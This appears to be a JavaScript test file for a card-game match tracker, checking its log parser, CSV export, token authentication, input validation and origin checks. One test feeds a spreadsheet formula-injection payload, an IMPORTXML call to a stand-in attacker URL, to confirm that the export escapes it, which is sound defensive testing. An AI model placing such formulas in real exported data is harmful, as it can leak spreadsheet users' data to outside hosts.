import assert from 'node:assert/strict';
import {inspectBattleLog,recordsCSV,statsCSV} from '../public/match-tracker-core.mjs';
import worker from '../worker/match-tracker.mjs';
const raw='Setup\r\nMckCo drew 7 cards for the opening hand.\r\nRival drew 7 cards for the opening hand.\r\nMckCo decided to go first.\r\nMckCo won the game!\r\n';
const parsed=inspectBattleLog(raw,'MckCo');
assert.deepEqual(parsed.players,['MckCo','Rival']);
assert.equal(parsed.result,'win');
assert.equal(parsed.wentFirst,true);
assert.equal(inspectBattleLog(raw,'Rival').result,'loss');
assert.equal(inspectBattleLog('Setup\nNo final line','MckCo').result,null);
const csv=recordsCSV([{id:'1',notes:'=IMPORTXML("https://attacker")',playedAt:'2026-11-21'}]);
assert(csv.includes("'=IMPORTXML")); // Guard spreadsheet formula injection.
assert(statsCSV({matchups:[{my_deck:'Pory-Hon',opponent_deck:'Dragapult',total:3,wins:2,losses:1,ties:0}]}).includes('66.67%'));
const url='https://toolbelt.example/api/match-tracker';
let inserted=null;
const env={
 MATCH_TRACKER_TOKEN:'a-strong-secret-only-in-worker-env',
 MATCHES_DB:{prepare(sql){return {bind(...args){return {async run(){inserted={sql,args};return {meta:{changes:1}}}}}}}},
 ASSETS:{fetch(){return new Response('static asset')}}
};
const request=(path,method='GET',body,auth='Bearer a-strong-secret-only-in-worker-env')=>
 new Request(url+path,{method,headers:{Authorization:auth,Origin:'https://toolbelt.example','Content-Type':'application/json'},...(body?{body:JSON.stringify(body)}:{})});
let r=await worker.fetch(request('/health'),env);
assert.equal(r.status,200);assert.equal((await r.json()).configured,true);
r=await worker.fetch(request('/matches','GET',null,'Bearer incorrect'),env);
assert.equal(r.status,401);
r=await worker.fetch(request('/matches','GET'),{ASSETS:env.ASSETS});
assert.equal(r.status,503);
r=await worker.fetch(request('/matches','POST',{
 playedAt:'2026-11-21',source:'ptcgl',matchType:'testing',format:'bo1',result:'win',wentFirst:true,
 rawLog:raw,myDeck:'Pory-Hon',opponentDeck:'Dragapult',parsed
}),env);
assert.equal(r.status,201);
assert.equal(inserted.args[15],raw,'Original CRLF battle log must be preserved byte-for-byte as a JS string');
assert.equal(inserted.args[3],'ptcgl');
assert.match(inserted.args[16],/^[0-9a-f]{64}$/);
r=await worker.fetch(request('/matches','POST',{
 playedAt:'2026-11-21',source:'ptcgl',matchType:'testing',format:'bo1',result:'win',rawLog:''
}),env);
assert.equal(r.status,400);
r=await worker.fetch(new Request(url+'/matches',{headers:{Authorization:'Bearer a-strong-secret-only-in-worker-env',Origin:'https://evil.example'}}),env);
assert.equal(r.status,403);
r=await worker.fetch(new Request('https://toolbelt.example/'),env);
assert.equal(await r.text(),'static asset');
console.log('Match Tracker parser, CSV, cloud auth, validation, and verbatim-log smoke tests passed.');
